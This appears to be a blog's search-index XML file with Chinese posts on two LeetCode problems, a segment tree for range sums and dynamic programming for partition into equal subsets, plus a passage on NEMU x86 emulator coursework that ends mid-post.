<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>LeetCode307-区域和检索</title>
    <url>/2020/10/15/1/</url>
    <content><![CDATA[<h2 id="description"><a class="markdownIt-Anchor" href="#description"></a> Description</h2>
<p>给定一个整数数组 nums，求出数组从索引 i 到 j  (i ≤ j) 范围内元素的总和，包含 i,  j 两点。</p>
<p>update(i, val) 函数可以通过将下标为 i 的数值更新为 val，从而对数列进行修改。</p>
<h2 id="examples"><a class="markdownIt-Anchor" href="#examples"></a> Examples</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Given nums &#x3D; [1, 3, 5]</span><br><span class="line"></span><br><span class="line">sumRange(0, 2) -&gt; 9</span><br><span class="line">update(1, 2)</span><br><span class="line">sumRange(0, 2) -&gt; 8</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="thought"><a class="markdownIt-Anchor" href="#thought"></a> Thought</h2>
<h3 id="segement-tree线段树"><a class="markdownIt-Anchor" href="#segement-tree线段树"></a> Segement Tree(线段树)</h3>
<p>一颗线段树的构造就是根据区间的性质的来构造的, 如下是一棵区间<code>[0, 3]</code>的线段树，每个<code>[start, end]</code>都是一个二叉树中的节点。</p>
<pre class="mermaid">graph TD;
	A["[0,3]"] --> B["[0,1]"];
	A["[0,3]"] --> C["[2,3]"];
	B --> D["[0,0]"];
	B --> E["[1,1]"];
	C --> F["[2,2]"];
	C --> G["[3,3]"];</pre>
<p>区间划分大概就是上述的区间划分。可以看出每次都将区间的长度一分为二,数列长度为<code>n</code>,所以线段树的高度是<code>log(n)</code>,这是很多高效操作的基础。<br>
上述的区间存储的只是区间的左右边界。我们可以将区间的最大值加入进来,也就是树中的<code>Node</code>需要存储<code>left</code>，<code>right</code>左右子节点外，还需要存储<code>start</code>, <code>end</code>, <code>val</code>区间的范围和区间内表示的值。</p>
<p><strong>可以储存不同的值，例如区间内的最大值，最小值，区间的求和等等。</strong></p>
<p>因为每次将区间的长度一分为二,所有创造的节点个数，即底层有<code>n</code>个节点，那么倒数第二次约<code>n/2</code>个节点，倒数第三次约<code>n/4</code>个节点，依次类推：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n + 1&#x2F;2 * n + 1&#x2F;4 * n + 1&#x2F;8 * n + ...</span><br><span class="line">&#x3D;   (1 + 1&#x2F;2 + 1&#x2F;4 + 1&#x2F;8 + ...) * n</span><br><span class="line">&#x3D;   2n</span><br></pre></td></tr></table></figure>
<p><strong>所以构造线段树的时间复杂度和空间复杂度都为<code>O(n)</code>。</strong></p>
<h2 id="solution"><a class="markdownIt-Anchor" href="#solution"></a> Solution</h2>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">segmentTree</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(start,end,sum)&#123;</span><br><span class="line">        <span class="keyword">this</span>.start = start;</span><br><span class="line">        <span class="keyword">this</span>.end = end;</span><br><span class="line">        <span class="keyword">this</span>.sum = sum;</span><br><span class="line">        <span class="keyword">this</span>.left = <span class="keyword">this</span>.right = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> NumArray = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// console.log(nums.length);</span></span><br><span class="line">    <span class="keyword">this</span>.segmentTree = build(<span class="number">0</span>,nums.length<span class="number">-1</span>,nums);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> build = <span class="function"><span class="keyword">function</span>(<span class="params">left,right,array</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(left &gt; right)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> root = <span class="keyword">new</span> segmentTree(left,right,array[left]);</span><br><span class="line">    <span class="keyword">if</span>(left === right)&#123;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> mid = <span class="built_in">Math</span>.floor((left+right)/<span class="number">2</span>);</span><br><span class="line">    root.left = build(left,mid,array);</span><br><span class="line">    root.right = build(mid+<span class="number">1</span>,right,array);</span><br><span class="line">    root.sum = root.left.sum+root.right.sum;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NumArray.prototype.update = <span class="function"><span class="keyword">function</span>(<span class="params">i,val</span>) </span>&#123;</span><br><span class="line">    modify(<span class="keyword">this</span>.segmentTree,i,val);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> modify = <span class="function"><span class="keyword">function</span>(<span class="params">root,index,value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root.start == index &amp;&amp; root.end == index)&#123;</span><br><span class="line">        root.sum = value;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> mid = <span class="built_in">Math</span>.floor((root.start+root.end)/<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(index&lt;=mid)&#123;</span><br><span class="line">        modify(root.left,index,value);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        modify(root.right,index,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    root.sum = root.left.sum+root.right.sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;number&#125;</span> </span>i </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;number&#125;</span> <span class="variable">j</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;number&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">NumArray.prototype.sumRange = <span class="function"><span class="keyword">function</span>(<span class="params">i,j</span>) </span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="keyword">this</span>.segmentTree);</span><br><span class="line">   <span class="keyword">let</span> res = query(<span class="keyword">this</span>.segmentTree,i,j);</span><br><span class="line">   <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> query = <span class="function"><span class="keyword">function</span>(<span class="params">root,start,end</span>)</span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(start == root.start &amp;&amp; root.end == end)&#123;</span><br><span class="line">        <span class="keyword">return</span> root.sum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> mid = <span class="built_in">Math</span>.floor((root.start+root.end)/<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">let</span> leftsum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> rightsum=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//左子区</span></span><br><span class="line">    <span class="keyword">if</span>(mid &gt;= start)&#123;</span><br><span class="line">        <span class="keyword">if</span>(mid&lt;end)&#123;</span><br><span class="line">            leftsum = query(root.left,start,mid);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            leftsum = query(root.left,start,end);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//右子区</span></span><br><span class="line">    <span class="keyword">if</span>(mid&lt;end)&#123;</span><br><span class="line">        <span class="keyword">if</span>(start &lt;= mid)&#123;</span><br><span class="line">            rightsum = query(root.right,mid+<span class="number">1</span>,end);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            rightsum = query(root.right,start,end);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> leftsum+rightsum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>Leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode416-分割等和子集</title>
    <url>/2020/10/11/1/</url>
    <content><![CDATA[<h2 id="description"><a class="markdownIt-Anchor" href="#description"></a> Description</h2>
<p>给定一个<strong>只包含正整数</strong>的<strong>非空</strong>数组。是否可以将这个数组分割成两个子集，使得两个子集的元素和相等。</p>
<h2 id="examples"><a class="markdownIt-Anchor" href="#examples"></a> Examples</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1, 5, 11, 5]</span><br><span class="line"></span><br><span class="line">输出: true</span><br><span class="line"></span><br><span class="line">解释: 数组可以分割成 [1, 5, 5] 和 [11].</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [1, 2, 3, 5]</span><br><span class="line"></span><br><span class="line">输出: false</span><br><span class="line"></span><br><span class="line">解释: 数组不能分割成两个元素和相等的子集.</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="thought"><a class="markdownIt-Anchor" href="#thought"></a> Thought</h2>
<p>由于所给数组的规模不确定，所要分成的数组的规模的大小，所以不能使用循环嵌套的方法遍历所有可能性，即不能在多项式时间内解决（NP问题）。如果使用贪心则只能求得局部最优解而不能取得全局的解。因此此题需要使用记忆性搜索或者动态规划的方法来解决。</p>
<p>考虑到对于任意一个数我们都有选择或者不选这两种选择，因为我们可以开一个二维数组dp[n][target+1]，其中n表示nums数组中的数据大小。target表示将nums数组中的数据进行累计求和后得到的和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mi>s</mi><mi>u</mi><mi>m</mi></mrow><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{sum}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.040392em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">s</span><span class="mord mathdefault mtight">u</span><span class="mord mathdefault mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，对于数组中的任意位置dp[i][j],表示的是当选择到第i个数的时候是否可以达到j的值。</p>
<p>在进行动态规划之前我们应当去考虑临界条件。首先，当nums数组的规模小于2时，必定没有解，因此直接返回false；当maxNum大于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mi>n</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{n}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.040392em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>时，也不可能找到解，因此直接返回false；当sum为奇数时，说明不可能等分为两个同样的集合，因此也直接返回false。</p>
<p>首先要将整个dp数组进行初始化，即将整个数组都设为false。然后我们需要考虑对dp数组的初始状态进行设置。考虑到当j=0即当没有num被选择时，应当将这一列全部设置为true。当nums[0]被选择时，也应当将dp[0][nums[0]]的值设置为true。</p>
<p>将dp数组初始化之后我们就需要对数组进行状态转移，考虑到对于任意的i,j的状态数组dp[i][j]，当此时所选择的nums[i]大于j时，此时nums[i]一定不能被选择，那么此时的状态即为dp[i][j] = dp[i-1][j],当nums[i]&lt;j时，那么表明当前的数据nums[i]可以被选择，那么此时的状态就可以有两种选择dp[i-1][j]和dp[i-1][j-nums[i]]，因此状态转移方程如下：</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mspace width="1em"><mi mathvariant="normal">∣</mi><mspace width="1em"><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo>−</mo><mi>n</mi><mi>u</mi><mi>m</mi><mi>s</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">]</mo></mspace></mspace></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">dp[i][j] = \begin{cases}
dp[i-1][j] \\
dp[i-1][j] \quad|\quad dp[i-1][j-nums[i]]
\end{cases}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:1em;"></span><span class="mord">∣</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">u</span><span class="mord mathdefault">m</span><span class="mord mathdefault">s</span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mclose">]</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<h2 id="solution"><a class="markdownIt-Anchor" href="#solution"></a> Solution</h2>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;number[]&#125;</span> <span class="variable">nums</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;boolean&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> canPartition = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> n = nums.length;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;<span class="number">2</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> maxNum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">        sum+=nums[i];</span><br><span class="line">        <span class="keyword">if</span>(nums[i]&gt;maxNum)&#123;</span><br><span class="line">            maxNum = nums[i]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span>(sum &amp; <span class="number">1</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> target = sum/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(maxNum&gt;target)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> dp = <span class="keyword">new</span> <span class="built_in">Array</span>(n);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//initial dp array</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        dp[i] = <span class="keyword">new</span> <span class="built_in">Array</span>(target+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> j=<span class="number">0</span>;j&lt;=target;j++)&#123;</span><br><span class="line">            dp[i][j] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//set dp[i][0] = 1 because no value is selected</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        dp[i][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//initial</span></span><br><span class="line">    dp[<span class="number">0</span>][nums[<span class="number">0</span>]] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//dp</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">let</span> num = nums[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> j=<span class="number">1</span>;j&lt;=target;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(j&lt;num)&#123;</span><br><span class="line">                dp[i][j] = dp[i<span class="number">-1</span>][j];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i][j] = dp[i<span class="number">-1</span>][j-num] | dp[i<span class="number">-1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[n<span class="number">-1</span>][target];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="optimization"><a class="markdownIt-Anchor" href="#optimization"></a> optimization</h2>
<p>考虑到在更新dp数组的状态的时候每次dp[i][j]都会以上一行作为参考进行状态转移，因此我们可以对于该数组进行空间优化,即将dp[n][target+1]修改为dp[target+1]，因此我们可以将空间复杂度由原来的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>×</mo><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n \times target)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span>减少为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(target)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span>。考虑到每一次更新状态时都要取上一行的状态，因此在更新状态时需要将j从大到小进行遍历。因为如果从小到大进行遍历的话，当计算dp[j]的状态是,dp[j-nums[i]]已经被更新过了，即被更新为第i行的数据，因此不可解。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">let</span> num = nums[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> j=target;j&gt;=num;j--)&#123;</span><br><span class="line">            dp[j] |= dp[j-num];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[target];</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>Leetcode</tag>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>NEMU</title>
    <url>/2020/09/29/1/</url>
    <content><![CDATA[<h2 id="get-started-起步"><a class="markdownIt-Anchor" href="#get-started-起步"></a> Get Started 起步</h2>
<h3 id="description-描述"><a class="markdownIt-Anchor" href="#description-描述"></a> Description 描述</h3>
<p>PA讲述的是一个&quot;先驱创造计算机&quot;的故事。</p>
<p>本实践课程所要设计的“NEMU”一款经过简化的 x86 全系统模拟器。</p>
<a id="more"></a>
<h3 id="pa0"><a class="markdownIt-Anchor" href="#pa0"></a> PA0</h3>
<p><strong>寄存器结构体</strong></p>
<p>在框架的源码中，为了考察我们寄存器的结构，作者故意地使用了错误的数据结构来描述寄存器。使用结构体来描述寄存器的内部结构，会错误地计算寄存器的地址空间。因此我们首先需要将结构体改为联合体来描述寄存器的地址。</p>
<p>在<code>include\cpu\reg.h</code>文件里修改寄存器的描述</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="keyword">union</span>&#123;</span><br><span class="line">			<span class="keyword">uint32_t</span> _32;</span><br><span class="line">			<span class="keyword">uint16_t</span> _16;</span><br><span class="line">			<span class="keyword">uint8_t</span> _8[<span class="number">2</span>];</span><br><span class="line">		&#125;gpr[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">		&#123;</span></span><br><span class="line">			<span class="keyword">uint32_t</span> eax, ecx, edx, ebx, esp, ebp, esi, edi;</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="comment">//store </span></span><br><span class="line">	<span class="keyword">swaddr_t</span> eip;</span><br><span class="line"></span><br><span class="line">&#125; CPU_state;</span><br></pre></td></tr></table></figure>
<h3 id="pa1"><a class="markdownIt-Anchor" href="#pa1"></a> PA1</h3>
<h4 id="单步执行"><a class="markdownIt-Anchor" href="#单步执行"></a> 单步执行</h4>
<p>完成这个操作很简单，因为框架已经实现了cpu_exec()函数模拟cpu的调用，我们只需读取命令行参数并且进行函数的调用就可以完成。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">cmd_si</span><span class="params">(<span class="keyword">char</span> *args)</span></span>&#123;</span><br><span class="line">	<span class="comment">//initliza the step</span></span><br><span class="line">	<span class="keyword">int</span> <span class="built_in">step</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(args == <span class="literal">NULL</span>)<span class="built_in">step</span>=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">sscanf</span>(args,<span class="string">"%d"</span>,&amp;<span class="built_in">step</span>);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	cpu_exec(<span class="built_in">step</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="打印寄存器"><a class="markdownIt-Anchor" href="#打印寄存器"></a> 打印寄存器</h4>
<p>本题提供两个参数，‘r’表示打印寄存器状态，‘w’表示打印监视点，因为监视点需要和后面的任务有关，这里暂时先不讲。打印寄存器很简单，只需要调用寄存器的状态并将其打印出来即可，我们定义一个<code>printRegisters</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printRegisters</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"eax: 0x%-10x  %-10d\n"</span>, cpu.eax, cpu.eax);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"edx: 0x%-10x  %-10d\n"</span>, cpu.edx, cpu.edx);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"ecx: 0x%-10x  %-10d\n"</span>, cpu.ecx, cpu.ecx);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"ebx: 0x%-10x  %-10d\n"</span>, cpu.ebx, cpu.ebx);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"ebp: 0x%-10x  %-10d\n"</span>, cpu.ebp, cpu.ebp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"esi: 0x%-10x  %-10d\n"</span>, cpu.esi, cpu.esi);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"esp: 0x%-10x  %-10d\n"</span>, cpu.esp, cpu.esp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"eip: 0x%-10x  %-10d\n"</span>, cpu.eip, cpu.eip);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="扫描内存"><a class="markdownIt-Anchor" href="#扫描内存"></a> 扫描内存</h4>
<p>扫描内存提供两个参数选项，扫描的地址和地址附近字节的内存扫描。因此我们只需要对命令行的两个参数分别进行处理就可以了。扫描的地址有简单和复杂两种状态。简单状态即输入16进制的数，复杂则可以输入表达式，复杂状态我们需要调用下一问中的表达式求值的函数进行解析。</p>
<p><strong>表达式只能是16进制数：</strong></p>
